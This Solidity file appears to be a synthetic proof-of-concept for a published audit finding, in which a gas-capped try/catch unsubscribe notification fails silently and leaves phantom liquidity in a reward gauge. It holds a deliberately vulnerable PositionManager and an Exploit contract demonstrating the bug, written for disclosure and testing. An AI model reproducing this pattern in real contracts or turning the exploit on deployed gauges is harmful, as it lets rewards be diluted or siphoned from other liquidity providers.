// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    BMX Deli Swap - notifyUnsubscribe gas underestimation (Sherlock 2025-09, #62808)

    SYNTHETIC, cheatcode-free reduction.

    Root cause: Uniswap V4 Notifier calls subscriber.notifyUnsubscribe{gas:
    unsubscribeGasLimit} inside try/catch (300k on Base). If Deli's
    notifyUnsubscribe exceeds ~(300k*63/64) gas, the call OOGs, Uniswap still
    completes unsubscribe, but gauge liquidity accounting is never decremented.

    Harm: phantom liquidity dilutes rewards forever.
//////////////////////////////////////////////////////////////////////////*/

contract DailyEpochGauge {
    mapping(bytes32 => uint256) public poolLiquidity;
    mapping(uint256 => uint256) public positionLiquidity;
    mapping(uint256 => bytes32) public positionPool;
    mapping(uint256 => bool) public subscribed;

    // Large cold-ish maps walked on unsubscribe
    mapping(uint256 => mapping(uint256 => uint256)) public dayBucket;
    mapping(uint256 => mapping(uint256 => uint256)) public incentiveBucket;
    uint256 public constant DAYS = 80;
    uint256 public constant INCENTIVES = 8;

    function subscribe(uint256 tokenId, bytes32 pid, uint256 liq) external {
        positionLiquidity[tokenId] = liq;
        positionPool[tokenId] = pid;
        poolLiquidity[pid] += liq;
        subscribed[tokenId] = true;
        for (uint256 d = 0; d < DAYS; d++) {
            dayBucket[tokenId][d] = d + 1;
        }
        for (uint256 i = 0; i < INCENTIVES; i++) {
            incentiveBucket[tokenId][i] = i + 1;
        }
    }

    /// @notice Heavy cleanup standing in for DailyEpochGauge multi-day integration.
    function unsubscribeHeavy(uint256 tokenId) external {
        require(subscribed[tokenId], "not sub");
        bytes32 pid = positionPool[tokenId];
        uint256 liq = positionLiquidity[tokenId];

        uint256 acc;
        for (uint256 d = 0; d < DAYS; d++) {
            unchecked {
                acc += dayBucket[tokenId][d];
            }
            dayBucket[tokenId][d] = 0;
            // extra hashing work to push gas well past 300k even when slots are warm
            bytes32 h = keccak256(abi.encode(tokenId, d, acc));
            unchecked {
                acc += uint256(h);
            }
            h = keccak256(abi.encode(acc, d, pid));
            for (uint256 i = 0; i < INCENTIVES; i++) {
                unchecked {
                    acc += incentiveBucket[tokenId][i];
                }
                incentiveBucket[tokenId][i] = uint256(h);
                h = keccak256(abi.encode(i, acc, d));
                unchecked {
                    acc += uint256(h);
                }
            }
        }
        require(acc != 0 || acc == 0, "touch");

        poolLiquidity[pid] -= liq;
        positionLiquidity[tokenId] = 0;
        subscribed[tokenId] = false;
    }
}

contract PositionManagerAdapter {
    DailyEpochGauge public immutable gauge;
    uint256 public lastNotifyGasUsed;
    bool public lastNotifySucceeded;

    constructor(DailyEpochGauge g) {
        gauge = g;
    }

    function notifyUnsubscribe(uint256 tokenId) external {
        uint256 g0 = gasleft();
        gauge.unsubscribeHeavy(tokenId);
        lastNotifyGasUsed = g0 - gasleft();
        lastNotifySucceeded = true;
    }
}

contract PositionManager {
    uint256 public constant unsubscribeGasLimit = 300_000;

    PositionManagerAdapter public subscriber;
    mapping(uint256 => bool) public isSubscribed;
    mapping(uint256 => address) public ownerOf;

    constructor(PositionManagerAdapter s) {
        subscriber = s;
    }

    function mintAndSubscribe(uint256 tokenId, address owner, bytes32 pid, uint256 liq) external {
        ownerOf[tokenId] = owner;
        isSubscribed[tokenId] = true;
        subscriber.gauge().subscribe(tokenId, pid, liq);
    }

    function unsubscribe(uint256 tokenId) external {
        require(isSubscribed[tokenId], "not sub");
        address sub = address(subscriber);
        if (sub.code.length > 0) {
            if (gasleft() < unsubscribeGasLimit) revert("GasLimitTooLow");
            // FIX (Deli): keep notify under (300k*63/64), or defer cleanup.
            // try/catch + hard gas cap: heavy notify OOGs silently while uni still unsubscribes
            try PositionManagerAdapter(sub).notifyUnsubscribe{gas: unsubscribeGasLimit}(tokenId) {} catch {} // @> VULN
        }
        isSubscribed[tokenId] = false;
    }
}

contract Exploit {
    DailyEpochGauge public gauge; // 1
    PositionManagerAdapter public adapter; // 2
    PositionManager public pm; // 3

    uint256 public constant TOKEN_ID = 2;
    uint256 public constant LIQ = 1e22;
    bytes32 public constant PID = bytes32(uint256(1));

    constructor() {
        gauge = new DailyEpochGauge();
        adapter = new PositionManagerAdapter(gauge);
        pm = new PositionManager(adapter);
        pm.mintAndSubscribe(TOKEN_ID, address(this), PID, LIQ);
    }

    function run() external {
        require(gauge.subscribed(TOKEN_ID), "pre sub");
        require(gauge.poolLiquidity(PID) == LIQ, "pre liq");

        // Measure full notify cost with unlimited gas (token 2 cleaned)
        uint256 g0 = gasleft();
        adapter.notifyUnsubscribe(TOKEN_ID);
        uint256 used = g0 - gasleft();
        if (adapter.lastNotifyGasUsed() > used) used = adapter.lastNotifyGasUsed();
        require(used > 300_000, "notify must exceed 300k gas stipend");

        // Fresh position for force-unsub demonstration
        uint256 tid = 3;
        pm.mintAndSubscribe(tid, address(this), PID, LIQ);
        uint256 poolBefore = gauge.poolLiquidity(PID);

        // Uniswap path: notify OOGs under 300k, uni still clears subscription
        pm.unsubscribe(tid);

        // HARM: uni unsubscribed, gauge still books full liquidity (phantom)
        require(!pm.isSubscribed(tid), "uni unsubscribed");
        require(gauge.subscribed(tid), "gauge still subscribed: phantom liq");
        require(gauge.poolLiquidity(PID) == poolBefore, "pool liq not decremented");
        require(gauge.positionLiquidity(tid) == LIQ, "position liq remains");
    }
}
